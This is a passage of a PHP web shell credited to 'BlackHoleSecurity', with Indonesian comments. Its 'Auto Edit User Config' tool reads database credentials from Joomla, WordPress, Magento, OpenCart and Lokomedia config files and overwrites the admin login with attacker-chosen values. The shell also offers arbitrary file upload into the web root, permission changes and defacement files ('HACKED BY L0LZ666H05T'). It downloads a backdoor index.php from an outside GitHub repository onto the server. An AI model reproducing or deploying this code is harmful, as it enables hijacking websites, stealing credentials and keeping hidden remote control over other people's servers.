					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		//echo "<center>
		//<h1>Auto Edit User Config</h1>
		//<form method='post'>
		//DIR Config: <br>
		//<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		//Set User & Pass: <br>
		//<input type='text' name='user_baru' value='indoxploit' placeholder='user_baru'><br>
		//<input type='text' name='pass_baru' value='indoxploit' placeholder='pass_baru'><br>
		//<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		//</form>
		//</tr>span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		//";
		?>
		<tr>
			<th colspan="5">
				<h2>AUTO EDIT USER CONFIG</h2>
			</th>
		</tr>
		<tr>
			<td colspan="5">
				<div class="alert alert-primary" role="alert">
					<center>
						This tools only work if you running into dir <u>config</u> ( ex : /home/user/public_html/name_config )
					</center>
				</div>
			</td>
		</tr>
		<form method="post">
			<tr>
				<td colspan="5">
					<input class="form-control" type="text" name="config_dir" value="<?php print @cwd() ?>">
				</td>
			</tr>
			<tr>
				<td colspan="5">
					<input class="form-control" type="text" name="user_baru" value="L0LZ666H05T" placeholder="New Username">
				</td>
			</tr>
			<tr>
				<td colspan="5">
					<input class="form-control" type="text" name="pass_baru" value="L0LZ666H05T" placeholder="New Password">
				</td>
			</tr>
			<tr>
				<td colspan="5">
					<input type="submit" name="hajar" class="btn btn-success" style="width:100%;">
				</td>
			</tr>
		</form>
		<?php
	}
}
            if ($_GET['do'] == 'chmods') {
            	if (isset($_POST['submit'])) {
            		@chmods($_GET['file'], $_POST['mode']);
            	}
            	?>
            	<form method="post">
            		<tr>
            			<td colspan="5">
            				<div class="alert alert-primary" role="alert">
            					Change Filename : <b><u><?php print $_GET['file'] ?></u></b>
            				</div>
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<input class="form-control" type="text" name="mode" value="<?php print @substr(@sprintf('%o', @fileperms($_GET['file'])), -4) ?>">
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<input class="btn btn-success" type="submit" name="submit" style="width:100%;">
            			</td>
            		</tr>
            	</form>
            	<?php
            }
            if ($_GET['do'] == 'makefile') {
            	if (isset($_POST['submit'])) {
            		if ($_POST['type'] == 'file') {
            			@makefile($_POST['filename'], $_POST['text']);
            		}
            		if ($_POST['type'] == 'dir') {
            			@makedir($_POST['filename']);
            		}
            	}
            	?>
            	<tr>
            		<th colspan="5">
            			<h2>ADD NEW FILE & DIR</h2>
            		</th>
            	</tr>
            	<form method="post">
            		<tr>
            			<td colspan="5">
            				<center>
            				<input type="radio" name="type" value="file" checked> file 
            				( <?php print @permission(@cwd(), @perms(@cwd())) ?> )
            				<input type="radio" name="type" value="dir"> dir 
            				( <?php print @permission(@cwd(), @perms(@cwd())) ?> )
            			    </center>  
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<center>If you want create <b><u>dir</u></b> please empty the text</center>
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<input class="form-control" type="text" name="filename" placeholder="filename/dir">
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<textarea class="form-control edit" name="text">HACKED BY L0LZ666H05T</textarea>
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<input class="btn btn-success" style="width:100%;" type="submit" name="submit">
            			</td>
            		</tr>
            	</form>
            	<?php
            	die();
            }
            if ($_GET['do'] == 'upload') {
            	if (isset($_POST['submit'])) {
            		if ($_POST['type'] == 'biasa') {
            			if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
            				?>
		                    <div class="alert alert-success" role="alert">
		                    	This File <b><u><?php print $_FILES['file']['name'] ?></u></b> Has Been Uploaded !
		                    </div>
		                    <?php
            			} else {
            				?>
		                    <div class="alert alert-danger" role="alert">
		                    	This File <b><u><?php print $_FILES['file']['name'] ?></u></b> Cannot Uploaded !
		                    </div>
		                    <?php
            			}
            		}
            		if ($_POST['type'] == 'home') {
            			$home = $_SERVER['DOCUMENT_ROOT'];
            			if (@copy($_FILES['file']['tmp_name'], $home.SEP.$_FILES['file']['name'])) {
            				?>
		                    <div class="alert alert-success" role="alert">
		                    	This File <b><u><a href="http://<?php print $_SERVER['SERVER_NAME'].SEP.$_FILES['file']['name'] ?>">
		                    		http://<?php print $_SERVER['SERVER_NAME'].SEP.$_FILES['file']['name'] ?>
		                    	</a></u></b> Has Been Uploaded !
		                    </div>
		                    <?php
            			} else {
            				?>
            				<div class="alert alert-danger" role="alert">
            					This File <b><u><?php print $_FILES['file']['name'] ?></u></b> Cannot Uploaded !
            				</div>
            				<?php
            			}
            		}
            	}
            	?>
            	<tr>
            		<th colspan="5">
            			<h2>UPLOAD FILE</h2>
            		</th>
            	</tr>
            	<form method="post" enctype="multipart/form-data">
            		<tr>
            			<td colspan="5">
            				<center>
            				<input type="radio" name="type" value="biasa" checked> biasa
            				( <?php print @permission(@cwd(), @perms(@cwd())) ?> )
            				<input type="radio" name="type" value="home"> home_root
            				( <?php print @permission($_SERVER['DOCUMENT_ROOT'], @perms($_SERVER['DOCUMENT_ROOT'])) ?> )
            			    </center>
            			</td>
            		</tr>
            		<tr>
            			<td colspan="5">
            				<div class="input-group mb-3">
                           <div class="input-group-prepend">
                             <input class="btn btn-success" name="submit" type="submit" value="UPLOAD">
                           </div>
                           <div class="custom-file">
                             <input type="file" name="file" class="custom-file-input" id="inputGroupFile03">
                             <label class="custom-file-label" for="inputGroupFile03">Choose file . . .</label>
                           </div>
                         </div>
            			</td>
            		</tr>
            	</form>
            	<?php
            }
			?>
		</tr>
    	<tr>
    		<th>Filename</th>
    		<th>Size</th>
    		<th>Permission</th>
    		<th colspan="2">Action</th>
    	</tr>
    	<?php
    	$scandir = @scandir(@cwd());
    	foreach ($scandir as $dir) {
    		if (!is_dir($dir)) continue;
    		if ($dir === '.' || $dir === '..') continue;
    		?>
    		<tr>
    			<td>
    				<img src="http://icons.iconarchive.com/icons/custom-icon-design/flatastic-1/256/folder-icon.png" class="icon"> 
    				 <a href="?dir=<?php print @cwd().SEP.$dir ?>"><?php print $dir ?></a>
    			</td>
    			<td><center>--</center></td>
    			<td><?php print @permission($dir, @perms($dir)) ?> 
                <div class="permission">
                ( <a href="?dir=<?php print @cwd() ?>&do=chmods&file=<?php print $dir ?>">
    			<?php print @substr(@sprintf('%o', @fileperms($dir)), -4) ?>
    			</a> )
                </div>
                </td>
    			<td>
    				<center>
    				<form method="post" action="?dir=<?php print @cwd() ?>">
    					<select class="btn btn btn-outline-success btn-sm" name="do" style="width:100%;">
    						<option value="renames">Rename</option>
    						<option value="delete">Delete</option>
    					</select>
    				</td>
    					<input type="hidden" name="file" value="<?php print $dir ?>">
    					<td><input type="submit" name="" class="btn btn-success btn-sm" style="width:100%;">
    				</form>
    			</center>
    			</td>
    		</tr> 
    		<?php
    	}
    	foreach ($scandir as $file) {
    		if (!is_file($file)) continue;
    		?>
    		<tr>
    			<td>
    				<img class="icon" src="https://pngimage.net/wp-content/uploads/2018/06/file-png-12.png">
    				 <?php print $file ?>
    			</td>
    			<td>
    				<center><?php print @size($file) ?></center>
    			</td>
    			<td><?php print @permission($file, @perms($file)) ?> 
    		    <div class="permission">
    		    ( <a href="?dir=<?php print @cwd() ?>&do=chmods&file=<?php print $file ?>">
    			<?php print @substr(@sprintf('%o', @fileperms($file)), -4) ?>
    			</a> )
    		    </div>
    		   </td>
    			<td><center>
    				<form method="post" action="?dir=<?php print @cwd() ?>">
    					<select class="btn btn btn-outline-success btn-sm" name="do" style="width:100%;">
    						<option value="edit">Edit</option>
    						<option value="renames">Rename</option>
    						<option value="delete">Delete</option>
    					</select>
    				</td>
    					<input type="hidden" name="file" value="<?php print $file ?>">
    					<td><input type="submit" name="" class="btn btn-success btn-sm" style="width:100%;">
    				</form>
    			</td>
    		</tr>
    		<?php
    	}
    	?>
    	<form method="post">
    	<tr>
    		<th colspan="5">
    		<?php
    		$link = "http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create";
            @createTools("adminer", "https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php");
            @createTools("index", "https://raw.githubusercontent.com/l0lz666h05t/backdoor/master/index.php");
    		?>
    		<select class="form-control" id="action" onchange="if (this.value) window.open(this.value);">
    			<option>Choose . . .</option>
    			<option value="<?php print $link ?>=adminer">Adminer</option>
    			<option value="<?php print $link ?>=index">index.php</option>
    		</select>
    		<noscript>
    				<input type="submit" value="Execute" style="width:100%;" class="btn btn-success">
    			</noscript>
    		</th>
    	</tr>
        </form>
    	<tr>
    		<th colspan="5">
    			&copy; <?php print @date("Y") ?> - BlackHoleSecurity 
    		</th>
    	</tr>
    </table>
	</div>
</center>
</body>
</html>
